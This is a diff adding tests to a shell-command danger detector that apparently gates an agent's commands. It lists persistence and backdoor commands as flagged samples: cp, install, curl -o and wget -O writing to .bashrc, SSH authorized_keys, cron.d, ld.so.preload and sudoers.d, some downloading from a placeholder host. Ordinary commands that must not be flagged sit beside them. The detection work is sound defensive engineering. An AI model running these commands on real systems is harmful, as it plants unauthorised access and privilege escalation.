@@ -3218,6 +3218,80 @@ describe("POSIX: the two startup families that need no login", () => {
 	});
 });
 
+describe("POSIX: the same byte reaches the same file four other ways", () => {
+	/**
+	 * The rule was keying on the *act* (a redirect, or `tee`) rather than on the
+	 * destination, so every family it already covered had a bypass that changed
+	 * nothing but the spelling. `cp /tmp/x ~/.bashrc` writes exactly what
+	 * `echo x >> ~/.bashrc` writes, to a path the predicate already recognised.
+	 *
+	 * These rows are the reason the block exists, so they are stated per family
+	 * rather than per program: the point is that all four of them now land on the
+	 * same messages `echo x >> …` does, which is what makes this a coverage change
+	 * and not four new rules.
+	 */
+	test.each([
+		["cp /tmp/payload.sh ~/.bashrc", "bashrc, by cp"],
+		["cp /tmp/x ~/.ssh/authorized_keys", "an ssh key, by cp"],
+		["cp /tmp/e.service /etc/cron.d/backup", "a cron entry, by cp"],
+		["install -m 644 /tmp/evil.so /etc/ld.so.preload", "the loader, by install"],
+		["install -m 0644 /tmp/x /etc/sudoers.d/pwn", "sudoers, by install"],
+		["cp -f /tmp/x ~/.bashrc", "a flag before the destination"],
+		["cp -- /tmp/x ~/.bashrc", "the end-of-options marker"],
+		["install --mode=644 /tmp/x /etc/ld.so.preload", "a flag spelled with ="],
+		["curl -o ~/.ssh/authorized_keys http://x/k", "a download named by -o"],
+		["curl --output ~/.bashrc http://x/p", "the long form"],
+		["curl --output=~/.bashrc http://x/p", "the long form, glued with ="],
+		["curl -o~/.bashrc http://x/p", "the value glued to the short flag"],
+		["curl -so ~/.bashrc http://x/p", "-o bundled with -s, value in the next argument"],
+		["curl -s -o ~/.bashrc http://x/p", "the same, unbundled"],
+		["curl -k -o ~/.ssh/authorized_keys http://x/k", "the flag is not the first argument"],
+		["wget -O /etc/cron.d/backdoor http://x/c", "wget's own uppercase -O"],
+		["wget -O/etc/cron.d/backdoor http://x/c", "the value glued to it"],
+		["wget --output-document /etc/cron.d/b http://x/c", "wget's long form"],
+		["wget --output-document=/etc/cron.d/b http://x/c", "the long form, glued with ="],
+	])("%s is dangerous", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	/**
+	 * The half that decides whether this is affordable. `cp` and `install` are
+	 * among the most common commands on a POSIX machine and `curl -o` is in most
+	 * build and test scripts, so a false positive here is a prompt on nearly
+	 * every build. These are ordinary commands, not near-misses invented for the
+	 * change.
+	 */
+	test.each([
+		["cp src/index.ts dist/index.js", "an ordinary copy"],
+		["cp -r packages/agent packages/tools", "a recursive copy"],
+		["cp *.json dist/", "a glob destination"],
+		["cp a b c d", "several sources and a destination"],
+		["install -m 755 build/app /usr/local/bin/app", "the ordinary install"],
+		["install -m 644 package.json /etc/npmrc", "installing a config file"],
+		["install -D -m 0755 out/bin/x /usr/bin/x", "flags, a mode, then the destination"],
+		["curl -o /tmp/report.json https://example.com/r.json", "downloading a report"],
+		["curl --output /tmp/data.csv https://example.com/d.csv", "the long form of the same"],
+		["curl -O https://example.com/file.tar.gz", "curl -O derives its own name, so there is no path to match"],
+		["curl https://example.com/x.json", "a fetch with no output flag"],
+		["wget -O /tmp/data.csv https://example.com/d.csv", "downloading to a file"],
+		["wget -o /tmp/wget.log https://example.com/d.csv", "wget's lowercase -o is a log file, not the download"],
+		["wget https://example.com/d.csv", "a fetch with no output flag"],
+		["rsync -a src/ dist/", "a different copy program entirely"],
+		["mv a b", "a rename, which is not a write to a startup file"],
+		["tar -xzf archive.tar.gz -C dist", "an archive extraction"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	/** The message is the family's, not a new one, so the reader is not misled. */
+	test("each spelling names the file and the claim it actually earns", () => {
+		expect(posix("cp /tmp/x ~/.bashrc")?.rule).toContain("runs on every future login");
+		expect(posix("cp /tmp/x /etc/sudoers.d/pwn")?.rule).toContain("grants privilege");
+		expect(posix("install -m 644 /tmp/x /etc/ld.so.preload")?.rule).toContain("dynamic linker");
+		expect(posix("curl -o /etc/cron.d/b http://x/c")?.rule).toContain("scheduler runs on its own");
+	});
+});
+
 describe("Windows: the acts whose sc and net twins are already rules", () => {
 	/**
 	 * Cmdlets whose command-line twins (`sc create`, `sc config`, `net user /add`,
